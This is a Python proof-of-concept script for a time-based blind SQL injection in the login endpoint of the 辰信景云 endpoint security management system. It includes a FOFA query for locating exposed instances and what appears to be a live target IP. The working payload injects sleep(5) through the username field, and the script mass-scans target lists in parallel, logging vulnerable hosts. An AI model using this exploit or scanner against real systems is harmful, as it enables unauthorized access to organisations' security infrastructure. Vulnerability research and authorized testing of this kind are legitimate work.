#fofa 搜索   "辰信景云终端安全管理系统" && icon_hash="-429260979"
#https://106.55.100.76
#先导包
import requests,argparse,sys,time
from multiprocessing import Pool

requests.packages.urllib3.disable_warnings()#关掉特定的报错信息


def banner():
    test = """
██╗     ██╗   ██╗ █████╗ ███╗   ██╗███╗   ███╗ █████╗  ██████╗ ██████╗ ██████╗ ███████╗
██║     ██║   ██║██╔══██╗████╗  ██║████╗ ████║██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝
██║     ██║   ██║███████║██╔██╗ ██║██╔████╔██║███████║██║     ██║   ██║██║  ██║█████╗  
██║     ██║   ██║██╔══██║██║╚██╗██║██║╚██╔╝██║██╔══██║██║     ██║   ██║██║  ██║██╔══╝  
███████╗╚██████╔╝██║  ██║██║ ╚████║██║ ╚═╝ ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                            author:luanma                           
    """
    print(test)

def poc(target):
    payload = '/api/user/login'

    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"
    data1 = "username=adaadad%40qq.com&password=0faac0c487739b005eef7f1901d4e61a&captcha="

    headers = {
        "Content-Length":"102",
        "Accept":"application/json,text/javascript,*/*;q=0.01",
        "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
    }
    #构造headers包时,一定要去空,一定要去空!!!!!
    try:
        res1 = requests.post(target+payload, headers=headers, data=data1, verify=False,timeout=10)
        time1 = res1.elapsed.total_seconds()
        if res1.status_code == 200:
            res2 = requests.post(target+payload, data=data, headers=headers, verify=False,timeout=10)
            time2 = res2.elapsed.total_seconds()
            if time2 - time1 > 4 and time2 > 5:
                print(f"[+]{target}存在sql注入漏洞")
                with open('output.txt','w') as f:
                    f.write(f"{target}")
            else:
                print(f"[-]{target}不存在sql注入漏洞")
        else:
            print(f"[-]{target}存在问题,请手工注入")
    except Exception as e:
        print(f"[-]{target}存在问题")


def main():
    banner()
    parse = argparse.ArgumentParser(description="辰信景云终端安全管理系统login存在sql注入漏洞")#实例化
    parse.add_argument('-u','--url',dest='url',type=str,help="请输入一个可能存在漏洞的url")
    parse.add_argument("-f","--file",dest="file",type=str,help='请输入一个额包含资产的文件')

    args = parse.parse_args()
    url_list = []
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n',''))
        mp = Pool(10)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: python {sys.argv[0]} -h or --help for help")


if __name__ == '__main__':
    main()